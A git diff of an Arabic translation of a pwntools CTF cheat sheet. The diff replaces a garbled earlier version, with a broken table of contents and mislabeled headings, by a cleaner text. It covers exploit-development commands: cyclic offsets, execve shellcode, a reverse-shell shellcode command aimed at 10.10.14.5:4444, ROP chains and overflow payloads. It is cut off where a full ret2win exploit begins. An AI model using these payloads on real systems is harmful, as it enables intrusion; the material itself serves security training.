@@ -1,45 +1,48 @@
-# 🔍 pwntools — ورقة مرجعية شاملة
-
 <!-- language-home-navigation -->
 [🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
 
-
-[pwntools](https://github.com/Gallopsled/pwntools) is a best-in-class CTF framework and exploit development library written in Python. Designed for rapid prototyping, binary exploitation (pwn), and reverse engineering, it provides a comprehensive suite of command-line tools (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) alongside a high-level Python API for interacting with local processes and remote sockets.
-
----
-
-## 📋 جدول المحتويات
-
-- [[ROP Chain Construction](#rop-chain-construction)](#core-capabilities)
-- [التثبيت](#installation)
-- [التثبيت](#command-line-utilities-pwn-cmd)
-  - [` `pwn cyclic` (Buffer Offset Calculation)](#pwn-cyclic-buffer-offset-calculation)
-  - [` `pwn checksec` (Mitigation Inspection)](#pwn-checksec-mitigation-inspection)
-  - [` `pwn asm` & `pwn disasm` (Assembler / Disassembler)](#pwn-asm--pwn-disasm-assembler--disassembler)
-  - [` `pwn shellcraft` (Shellcode Generator)](#pwn-shellcraft-shellcode-generator)
-  - [` `pwn template` (Exploit Skeleton Generator)](#pwn-template-exploit-skeleton-generator)
-- [` pwn template` (Exploit Skeleton Generator)](#python-exploit-development-workflow)
-  - [Process & Remote Socket Connections](#process--remote-socket-connections)
-  - [ELF Parsing & Symbols](#elf-parsing--symbols)
-  - [ROP Chain Construction](#rop-chain-construction)
-  - [Packing & Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
-- [أمثلة عملية](#complete-exploit-example-buffer-overflow--ret2win)
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## [ROP Chain Construction](#rop-chain-construction)
 
-- **Tubes Architecture**: Unified interface for interacting with local processes (`process`), remote TCP sockets (`remote`), and SSH sessions (`ssh`).
-- **Binary & Gadget Inspection**: Automated ELF symbol resolution, GOT/PLT lookup, and automated ROP chain synthesis.
-- **On-the-Fly Assembly**: Instant translation between assembly mnemonics and opcodes across x86, x86_64, ARM, MIPS, and AArch64.
-- **Shellcode Synthesis**: Pre-built, customizable shellcode templates for reverse shells, execve, file reading, and evasion.
+# ورقة الغش في pwntools
+
+[pwntools](https://github.com/Gallopsled/pwntools) هو إطار عمل CTF الأفضل في فئته ومكتبة تطوير استغلالية مكتوبة بلغة Python. تم تصميمه للنماذج الأولية السريعة والاستغلال الثنائي (pwn) والهندسة العكسية، وهو يوفر مجموعة شاملة من أدوات سطر الأوامر (`pwn cyclic` و`pwn checksec` و`pwn asm` و`pwn shellcraft`) إلى جانب واجهة برمجة تطبيقات Python عالية المستوى للتفاعل مع العمليات المحلية والمقابس البعيدة.
 
 ---
 
-## التثبيت
+## جدول المحتويات
 
+- [القدرات الأساسية](#القدرات الأساسية)
+- [التثبيت](#التثبيت)
+- [أدوات سطر الأوامر (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
+  - [`pwn cyclic` (حساب إزاحة المخزن المؤقت)](#pwn-cyclic-buffer-offset-calculation)
+  - [`pwn checksec` (فحص التخفيف)](#pwn-checksec-mitigation-inspection)
+  - [`pwn asm` & `pwn disasm` (المجمع / المفكك)](#pwn-asm--pwn-disasm-assembler--disassembler)
+  - [`pwn shellcraft` (مولد كود القشرة)](#pwn-shellcraft-shellcode-generator)
+  - [`pwn template` (استغلال مولد الهيكل العظمي)](#pwn-template-exploit-skeleton-generator)
+- [سير عمل تطوير برمجيات بايثون](#python-exploit-development-workflow)
+  - [اتصالات العملية والمقبس البعيد](#process--remote-socket-connections)
+  - [تحليل ELF والرموز](#elf-parsing--symbols)
+  - [بناء سلسلة ROP](#rop-chain-construction)
+  - [التعبئة والانتهاء (`p32` / `p64`)](#packing--endianness-p32--p64)
+- [مثال كامل لبرمجيات إكسبلويت (Buffer Overflow + ret2win)](#Complete-exploit-example-buffer-overflow--ret2win)
+
+---
+
+## القدرات الأساسية
+
+- **هندسة الأنابيب:** واجهة موحدة للتفاعل مع العمليات المحلية (`process`)، ومآخذ TCP عن بعد (`remote`)، وجلسات SSH (`ssh`).
+- **الفحص الثنائي والأداة:** دقة رمز ELF الآلية، والبحث عن GOT/PLT، والتوليف الآلي لسلسلة ROP.
+- **التجميع الفوري:** ترجمة فورية بين أساليب تقوية التجميع وأكواد التشغيل عبر x86 وx86_64 وARM وMIPS وAArch64.
+- **تركيب كود القشرة:** قوالب كود القشرة المعدة مسبقًا والقابلة للتخصيص للأصداف العكسية والتنفيذ وقراءة الملفات والتهرب.
+
+---
+
+## تثبيت
 ```bash
 # Ubuntu / Debian / Kali Linux
 sudo apt-get update && sudo apt-get install -y python3-pwntools
@@ -50,14 +53,12 @@ pip3 install pwntools
 # Verify command-line utilities
 pwn version
 ```
-
 ---
 
-## التثبيت
+## أدوات سطر الأوامر المساعدة (`pwn <cmd>`)
 
-### ` pwn cyclic` (Buffer Offset Calculation)
-Generate unique De Bruijn cyclic patterns to determine the exact crash offset (EIP / RIP overwrite):
-
+### `pwn cyclic` (حساب إزاحة المخزن المؤقت)
+قم بإنشاء أنماط دورية فريدة من نوعها لـ De Bruijn لتحديد إزاحة التعطل الدقيقة (الكتابة فوق EIP / RIP):
 ```bash
 # Generate a 200-byte unique pattern
 pwn cyclic 200
@@ -69,15 +70,13 @@ pwn cyclic -l 0x6161616c
 # 64-bit architecture cyclic pattern lookup
 pwn cyclic -l "faaa" -n 8
 ```
-
-### ` pwn checksec` (Mitigation Inspection)
-` pwn cyclic` (Buffer Offset Calculation)
+### `pwn checksec` (فحص التخفيف)
+التحقق من إجراءات تخفيف الأمان (Canary، وNX، وPIE، وRELRO، وASLR) لأي ملف ELF قابل للتنفيذ:
 ```bash
 pwn checksec /path/to/binary
 ```
-
-### ` pwn asm` & `pwn disasm` (Assembler / Disassembler)
-Assemble instructions into shellcode bytes directly from the terminal:
+### `pwn asm` و`pwn disasm` (المجمع/المفكك)
+قم بتجميع التعليمات في بايتات كود القشرة مباشرة من المحطة:
 ```bash
 # Assemble x86 instructions to hex bytes
 pwn asm "xor eax, eax; push eax"
@@ -88,9 +87,8 @@ pwn asm -c amd64 "mov rax, 59; syscall" --format hex
 # Disassemble raw hex bytes back to assembly
 pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
 ```
-
-### ` pwn shellcraft` (Shellcode Generator)
-Generate production-ready shellcode payloads directly to terminal stdout or binary files:
+### `pwn shellcraft` (مولد كود القشرة)
+قم بإنشاء حمولات كود القشرة الجاهزة للإنتاج مباشرةً إلى المحطة الطرفية stdout أو الملفات الثنائية:
 ```bash
 # Generate Linux x64 execve /bin/sh shellcode in hex
 pwn shellcraft amd64.linux.sh --format hex
@@ -101,18 +99,16 @@ pwn shellcraft amd64.linux.connect 10.10.14.5 4444
 # Output pure raw bytes directly into a file
 pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
 ```
-
-### ` pwn template` (Exploit Skeleton Generator)
-Generate a battle-tested Python exploit template for a target binary and remote server:
+### `pwn template` (استغلال مولد الهيكل العظمي)
+قم بإنشاء قالب استغلال Python تم اختباره في المعركة لخادم ثنائي وبعيد مستهدف:
 ```bash
 pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
 ```
-
 ---
 
-## ` pwn template` (Exploit Skeleton Generator)
+## سير عمل تطوير برمجيات إكسبلويت بايثون
 
-### Process & Remote Socket Connections
+### اتصالات العملية والمقبس البعيد
 ```python
 from pwn import *
 
@@ -133,18 +129,16 @@ io.sendline(b'Alice')
 # Switch to interactive shell once exploit succeeds
 io.interactive()
 ```
-
-### ELF Parsing & Symbols
-Python Exploit Development Workflow
+### تحليل ورموز ELF
+قراءة عناوين الوظائف وجداول GOT وPLT تلقائيًا دون إجراء عمليات بحث يدوية عن GDB:
 ```python
 elf = ELF('./vuln_binary')
 print(f"Target function address: {hex(elf.symbols['win'])}")
 print(f"puts() PLT address: {hex(elf.plt['puts'])}")
 print(f"puts() GOT address: {hex(elf.got['puts'])}")
 ```
-
-### ROP Chain Construction
-Build Return-Oriented Programming (ROP) chains automatically:
+### بناء سلسلة ROP
+بناء سلاسل البرمجة الموجهة نحو العودة (ROP) تلقائيًا:
 ```python
 elf = ELF('./vuln_binary')
 rop = ROP(elf)
@@ -155,9 +149,8 @@ print(rop.dump())
 
 payload = b"A" * 40 + rop.chain()
 ```
-
-### Packing & Endianness (`p32` / `p64`)
-Convert integer memory addresses into little-endian bytes:
+### التعبئة والانتهاء (`p32` / `p64`)
+تحويل عناوين الذاكرة الصحيحة إلى بايتات ذات نهاية صغيرة:
 ```python
 # 32-bit little-endian packing
 address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'
@@ -168,11 +161,9 @@ address_64 = p64(0x0000000000401156)
 # Unpacking bytes to integer
 val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
 ```
-
 ---
 
-## أمثلة عملية
-
+## مثال كامل للاستغلال (Buffer Overflow + ret2win)
 ```python
 #!/usr/bin/env python3
 from pwn import *
